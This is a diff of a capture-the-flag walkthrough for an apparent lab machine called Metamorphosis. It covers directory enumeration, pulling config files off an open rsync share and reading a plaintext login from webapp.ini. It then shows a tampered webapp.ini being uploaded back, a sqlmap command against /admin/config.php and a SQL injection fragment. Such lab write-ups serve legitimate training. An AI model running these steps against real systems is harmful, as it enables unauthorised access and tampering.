@@ -130,12 +130,10 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/.htaccess            (Status: 403) [Size: 278]
-/.hta                 (Status: 403) [Size: 278]
-/.htpasswd            (Status: 403) [Size: 278]
+...
 /admin                (Status: 301) [Size: 314] [--> http://10.201.70.130/admin/]
 /index.php            (Status: 500) [Size: 0]
-/server-status        (Status: 403) [Size: 278]
+...
 Progress: 4614 / 4615 (99.98%)
 ===============================================================
 Finished
@@ -143,19 +141,19 @@ Finished
 ```
 
 ```bash
-:~# dirsearch -u http://10.201.70.130 -i200,301,302,401
+:~# dirsearch -u http://10.10.49.104 -i200,301,302,401
 
   _|. _ _  _  _  _ _|_    v0.4.3.post1
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
 
-Output File: /root/reports/http_10.201.70.130/_25-10-07_21-16-44.txt
+Output File: /root/reports/http_10.10.49.104/_xx-xx-xx_xx-xx-xx.txt
 
 Target: http://10.201.70.130/
 
 [21:16:44] Starting: 
-[21:16:52] 301 -  314B  - /admin  ->  http://10.201.70.130/admin/
+[21:16:52] 301 -  314B  - /admin  ->  http://10.10.49.104/admin/
 [21:16:52] 200 -  129B  - /admin/
 [21:16:52] 200 -    0B  - /admin/config.php
 [21:16:53] 200 -  129B  - /admin/index.php
@@ -165,7 +163,7 @@ Task Completed
 
 
 ```bash
-:~/Metamorphosis# nc -nv 10.201.70.130 873
+:~/Metamorphosis# nc -nv 10.10.49.104 873
 Connection to 10.201.70.130 873 port [tcp/*] succeeded!
 @RSYNCD: 31.0
 @RSYNCD: 31.0
@@ -173,6 +171,130 @@ Connection to 10.201.70.130 873 port [tcp/*] succeeded!
 Conf           	All Confs
 @RSYNCD: EXIT
 ```
+
+```bash
+:~/Metamorphosis# rsync -av --list-only rsync://10.10.160.167:873
+Conf           	All Confs
+```
+
+```bash
+rsync -av --list-only rsync://10.10.49.104/Conf
+receiving incremental file list
+drwxrwxrwx          4,096 2021/04/10 21:03:08 .
+-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
+-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
+-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
+-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
+-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
+-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
+-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
+-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
+-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
+-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
+-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
+-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini
+
+sent 20 bytes  received 379 bytes  798.00 bytes/sec
+total size is 193,430  speedup is 484.79
+```
+
+
+
+
+:~/Metamorphosis# rsync -av rsync://10.10.49.104:873/Conf challenge
+receiving incremental file list
+created directory challenge
+./
+access.conf
+bluezone.ini
+debconf.conf
+ldap.conf
+lvm.conf
+mysql.ini
+php.ini
+ports.conf
+resolv.conf
+screen-cleanup.conf
+smb.conf
+webapp.ini
+
+sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
+total size is 193,430  speedup is 0.99
+
+
+
+:~/Metamorphosis/challenge# ls
+access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
+
+
+
+:~/Metamorphosis/challenge# cat webapp.ini
+[Web_App]
+env = prod
+user = tom
+password = theCat
+
+[Details]
+Local = No
+
+
+
+
+:~/Metamorphosis/challenge# nano webapp.ini
+
+
+
+:~/Metamorphosis/challenge# cat webapp.ini
+[Web_App]
+env = dev
+user = tom
+password = theCat
+
+[Details]
+Local = No
+
+
+
+:~/Metamorphosis/challenge# rsync -av webapp.ini rsync://10.10.160.167:873/Conf/webapp.ini
+sending incremental file list
+
+sent 68 bytes  received 12 bytes  160.00 bytes/sec
+total size is 71  speedup is 0.89
+
+
+
+
+
+:~/Metamorphosis/challenge# rsync -av webapp.ini rsync://10.10.49.104:873/Conf/webapp.ini
+sending incremental file list
+webapp.ini
+
+sent 186 bytes  received 41 bytes  151.33 bytes/sec
+total size is 71  speedup is 0.31
+
+
+
+:~/Metamorphosis/challenge# rsync -avH webapp.ini rsync://10.10.49.104:873/Conf/
+sending incremental file list
+
+sent 68 bytes  received 12 bytes  160.00 bytes/sec
+total size is 71  speedup is 0.89
+
+
+
+
+
+
+
+
+
+
+
+
+sqlmap -u http://$TARGET/admin/config.php --data "username=FUZZ" --level 5 --dbs
+
+
+
 
 <img width="1254" height="169" alt="image" src="https://github.com/user-attachments/assets/93ea17f2-777f-494e-adb0-3ce5fa2e3b69" />
 
@@ -204,11 +326,9 @@ total size is 193,430  speedup is 484.79
 
 
 ```bash
-:~/Metamorphosis# mkdir Challenge
-
-
-:~/Metamorphosis# rsync -av rsync://10.201.70.130/Conf ./Challenge
+:~/Metamorphosis# rsync -av rsync://10.10.160.167/Conf conf
 receiving incremental file list
+created directory conf
 ./
 access.conf
 bluezone.ini
@@ -223,19 +343,21 @@ screen-cleanup.conf
 smb.conf
 webapp.ini
 
-sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
+sent 255 bytes  received 194,360 bytes  129,743.33 bytes/sec
 total size is 193,430  speedup is 0.99
 ```
 
+<img width="1136" height="319" alt="image" src="https://github.com/user-attachments/assets/f8e646c7-b3e8-4e40-817a-92d988fec185" />
 
-<img width="1248" height="369" alt="image" src="https://github.com/user-attachments/assets/660e548e-5b2b-46a6-ae54-826647ae5109" />
-
+<br>
 
 ```bash
-root@ip-10-201-43-110:~/Metamorphosis# cd Challenge
-root@ip-10-201-43-110:~/Metamorphosis/Challenge# ls
+:~/Metamorphosis/conf# ls
 access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
-root@ip-10-201-43-110:~/Metamorphosis/Challenge# cat webapp.ini
+```
+
+```bash
+:~/Metamorphosis/Challenge# cat webapp.ini
 [Web_App]
 env = prod
 user = tom
@@ -243,8 +365,14 @@ password = theCat
 
 [Details]
 Local = No
-root@ip-10-201-43-110:~/Metamorphosis/Challenge# nano webapp.ini
-root@ip-10-201-43-110:~/Metamorphosis/Challenge# cat webapp.ini
+```
+
+```bash
+:~/Metamorphosis/Challenge# nano webapp.ini
+```
+
+```bash
+:~/Metamorphosis/Challenge# cat webapp.ini
 [Web_App]
 env = dev
 user = tom
@@ -254,31 +382,300 @@ password = theCat
 Local = No
 ```
 
+:~/Metamorphosis/conf# rsync -avH webapp.ini rsync://10.10.160.167:873/Conf
+sending incremental file list
+
+sent 68 bytes  received 12 bytes  160.00 bytes/sec
+total size is 71  speedup is 0.89
 
 
 
-<img width="1244" height="401" alt="image" src="https://github.com/user-attachments/assets/db0a1065-cbbe-4717-98d1-adc0b6379e02" />
 
 
 
 ```bash
-:~/Metamorphosis/Challenge# rsync -av webapp.ini rsync://10.201.70.130/Conf
+:~/Metamorphosis/conf# rsync -av webapp.ini rsync://10.10.160.167/Conf/webapp.ini
 sending incremental file list
 webapp.ini
 
 sent 186 bytes  received 41 bytes  454.00 bytes/sec
 total size is 71  speedup is 0.31
+```
+
+<img width="1136" height="127" alt="image" src="https://github.com/user-attachments/assets/79edbb3e-c1b4-4795-9e38-0f6240d42a2d" />
 
 
-<img width="1246" height="178" alt="image" src="https://github.com/user-attachments/assets/7b554e6e-9784-4be0-9241-91609abbf030" />
+<p>Navigate to  10.201.70.130/admin/</p>
 
-navigated to  10.201.70.130/admin/
+<img width="1133" height="290" alt="image" src="https://github.com/user-attachments/assets/41e393c7-8716-4e54-abdb-97524d66de1b" />
 
-<img width="1273" height="320" alt="image" src="https://github.com/user-attachments/assets/f900dfd7-3c74-4bb2-aae3-d84f8d2f6a00" />
+<p>View page source</p>
 
-Page source
+<img width="1128" height="163" alt="image" src="https://github.com/user-attachments/assets/2859796c-a3e0-49eb-a185-2e368eb69d49" />
 
-<img width="1275" height="177" alt="image" src="https://github.com/user-attachments/assets/8325f8ab-02bf-47f5-9774-e301579925e0" />
+<p>bluezone.ini</p>
+
+```bash
+[BlueZone]
+
+RegistrationKey=
+
+;0-Application Settings in HKEY_LOCAL_MACHINE, Session Settings in HKEY_CURRENT_USER
+
+;1-All Settings in HKEY_LOCAL_MACHINE
+
+;2-All Settings in HKEY_CURRENT_USER (default mode)
+
+BaseRegistry=2
+
+UsePersonalFolderAsWorkingDir=Yes
+
+UseAllUsersCommonFolderAsWorkingDir=No
+
+ProfileMode=Yes
+
+Web2HostModeStatusMsg=Cache Message: The BlueZone Web Administrator has posted files for updating ... please wait.
+
+Web2HostModeStatusTitle=Web-to-Host Control
+
+;DesktopMode=desktop.ini
+
+DesktopModeStatusMsg=Desktop Mode: The BlueZone Web Administrator has posted updated files for installation ... please wait.
+
+DesktopModeStatusTitle=Web-to-Host Control
+
+ 
+
+[HLLAPI]
+
+ConnectRetryMilliseconds=0
+...
+
+[Configuration Lock Feature]
+
+Lock=0
+
+LockFTP=0
+
+ 
+
+[Support]
+
+Line1=
+
+Line2=
+
+Line3=To contact Seagull Software Customer Support please visit our web site
+
+Line4=
+
+Line5=at: http://www.seagullsoftware.com and follow the "Customer Care" link
+
+Line6=
+
+Line7=which can be found under the main "Services and Support" category.
+...
+```
+
+<p>ldap.cpnf</p>
+
+```bash
+#
+# LDAP Defaults
+#
+
+# See ldap.conf(5) for details
+# This file should be world readable but not world writable.
+
+#BASE	dc=example,dc=com
+#URI	ldap://ldap.example.com ldap://ldap-master.example.com:666
+
+#SIZELIMIT	12
+#TIMELIMIT	15
+#DEREF		never
+
+# TLS certificates (needed for GnuTLS)
+TLS_CACERT	/etc/ssl/certs/ca-certificates.crt
+```
+
+<p>mysql.ini</p>
+
+```bash
+# MySQL Server Instance Configuration File
+...
+# CLIENT SECTION
+...
+[client]
+
+port=3306
+
+[mysql]
+
+default-character-set=utf8
+...
+# SERVER SECTION
+...
+[mysqld]
+#skip-innodb
+
+# The TCP/IP Port the MySQL Server will listen on
+port=3306
+max_allowed_packet=16M
+...
+```
+
+<p>access.conf</p>
+
+```bash
+# Login access control table.
+#
+# Comment line must start with "#", no space at front.
+# Order of lines is important.
+#
+# When someone logs in, the table is scanned for the first entry that
+# matches the (user, host) combination, or, in case of non-networked
+# logins, the first entry that matches the (user, tty) combination.  The
+# permissions field of that table entry determines whether the login will
+# be accepted or refused.
+#
+# Format of the login access control table is three fields separated by a
+# ":" character:
+#
+# [Note, if you supply a 'fieldsep=|' argument to the pam_access.so
+# module, you can change the field separation character to be
+# '|'. This is useful for configurations where you are trying to use
+# pam_access with X applications that provide PAM_TTY values that are
+# the display variable like "host:0".]
+#
+# 	permission : users : origins
+#
+# The first field should be a "+" (access granted) or "-" (access denied)
+# character.
+#
+# The second field should be a list of one or more login names, group
+# names, or ALL (always matches). A pattern of the form user@host is
+# matched when the login name matches the "user" part, and when the
+# "host" part matches the local machine name.
+#
+# The third field should be a list of one or more tty names (for
+# non-networked logins), host names, domain names (begin with "."), host
+# addresses, internet network numbers (end with "."), ALL (always
+# matches), NONE (matches no tty on non-networked logins) or
+# LOCAL (matches any string that does not contain a "." character).
+#
+# You can use @netgroupname in host or user patterns; this even works
+# for @usergroup@@hostgroup patterns.
+#
+# The EXCEPT operator makes it possible to write very compact rules.
+#
+# The group file is searched only when a name does not match that of the
+# logged-in user. Both the user's primary group is matched, as well as
+# groups in which users are explicitly listed.
+# To avoid problems with accounts, which have the same name as a group,
+# you can use brackets around group names '(group)' to differentiate.
+# In this case, you should also set the "nodefgroup" option.
+#
+# TTY NAMES: Must be in the form returned by ttyname(3) less the initial
+# "/dev" (e.g. tty1 or vc/1)
+#
+##############################################################################
+#
+# Disallow non-root logins on tty1
+#
+#-:ALL EXCEPT root:tty1
+#
+# Disallow console logins to all but a few accounts.
+#
+#-:ALL EXCEPT wheel shutdown sync:LOCAL
+#
+# Same, but make sure that really the group wheel and not the user
+# wheel is used (use nodefgroup argument, too):
+#
+#-:ALL EXCEPT (wheel) shutdown sync:LOCAL
+#
+# Disallow non-local logins to privileged accounts (group wheel).
+#
+#-:wheel:ALL EXCEPT LOCAL .win.tue.nl
+#
+# Some accounts are not allowed to login from anywhere:
+#
+#-:wsbscaro wsbsecr wsbspac wsbsym wscosor wstaiwde:ALL
+#
+# All other accounts are allowed to login from anywhere.
+#
+##############################################################################
+# All lines from here up to the end are building a more complex example.
+##############################################################################
+#
+# User "root" should be allowed to get access via cron .. tty5 tty6.
+#+ : root : cron crond :0 tty1 tty2 tty3 tty4 tty5 tty6
+#
+# User "root" should be allowed to get access from hosts with ip addresses.
+#+ : root : 192.168.200.1 192.168.200.4 192.168.200.9
+#+ : root : 127.0.0.1
+#
+# User "root" should get access from network 192.168.201.
+# This term will be evaluated by string matching.
+# comment: It might be better to use network/netmask instead.
+#          The same is 192.168.201.0/24 or 192.168.201.0/255.255.255.0
+#+ : root : 192.168.201.
+#
+# User "root" should be able to have access from domain.
+# Uses string matching also.
+#+ : root : .foo.bar.org
+#
+# User "root" should be denied to get access from all other sources.
+#- : root : ALL
+#
+# User "foo" and members of netgroup "nis_group" should be
+# allowed to get access from all sources.
+# This will only work if netgroup service is available.
+#+ : @nis_group foo : ALL
+#
+# User "john" should get access from ipv4 net/mask
+#+ : john : 127.0.0.0/24
+#
+# User "john" should get access from ipv4 as ipv6 net/mask
+#+ : john : ::ffff:127.0.0.0/127
+#
+# User "john" should get access from ipv6 host address
+#+ : john : 2001:4ca0:0:101::1
+#
+# User "john" should get access from ipv6 host address (same as above)
+#+ : john : 2001:4ca0:0:101:0:0:0:1
+#
+# User "john" should get access from ipv6 net/mask
+#+ : john : 2001:4ca0:0:101::/64
+#
+# All other users should be denied to get access from all sources.
+#- : ALL : ALL
+```
+
+<p>access.conf</p>
+
+```bash
+:~/Metamorphosis/conf# cat ports.conf
+# If you just change the port or add more ports here, you will likely also
+# have to change the VirtualHost statement in
+# /etc/apache2/sites-enabled/000-default.conf
+
+Listen 80
+
+<IfModule ssl_module>
+	Listen 443
+</IfModule>
+
+<IfModule mod_gnutls.c>
+	Listen 443
+</IfModule>
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+```
+
+<p>Launch Burp Suite. Enable FoxyProxy. Navigate to  10.201.70.130/admin/. Input <strong>tom</strong>. Submit query.</p>
+
+<img width="1132" height="307" alt="image" src="https://github.com/user-attachments/assets/bd2d8ec0-71f9-47a8-946b-872d81f9b1cc" />
+
 
 
 10.201.70.130/admin/
@@ -319,6 +716,13 @@ Refreshed
 
 
 <img width="1279" height="510" alt="image" src="https://github.com/user-attachments/assets/98a0ada8-2693-46a8-938c-bbd4b41e2c63" />
+
+
+<img width="1137" height="650" alt="image" src="https://github.com/user-attachments/assets/dae1eaaf-cadf-4f35-84b7-9282e7f18d45" />
+
+
+
+tom" -- -
 
 
 
